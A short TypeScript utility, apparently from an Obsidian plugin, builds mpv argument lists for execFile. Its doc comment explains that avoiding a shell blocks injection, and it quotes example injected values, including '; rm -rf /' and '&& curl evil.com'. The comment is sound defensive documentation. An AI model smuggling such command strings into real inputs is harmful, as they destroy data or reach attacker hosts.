/**
 * Pure mpv command-building utilities — no Obsidian dependency, fully testable.
 */

/**
 * Builds the argument list for spawning mpv via execFile.
 *
 * Returns a string[] so that callers can use execFile(binary, args) instead of
 * exec(commandString). Because execFile does NOT spawn a shell, every element
 * is passed verbatim to the OS — shell metacharacters in timestamps or file
 * paths (e.g. "; rm -rf /", "$(cmd)", "&& curl evil.com") are never
 * interpreted by a shell.
 *
 * @param timestamp    - Playback start position, e.g. "01:23:45"
 * @param luaScriptPath - Absolute path to the Lua capture script
 * @param absolutePath  - Absolute path to the video file
 * @returns Array of argument strings suitable for execFile('mpv', args)
 */
export function buildMpvArgs(timestamp: string, luaScriptPath: string, absolutePath: string): string[] {
	return [
		`--start=${timestamp}`,
		`--script=${luaScriptPath}`,
		absolutePath,
	];
}
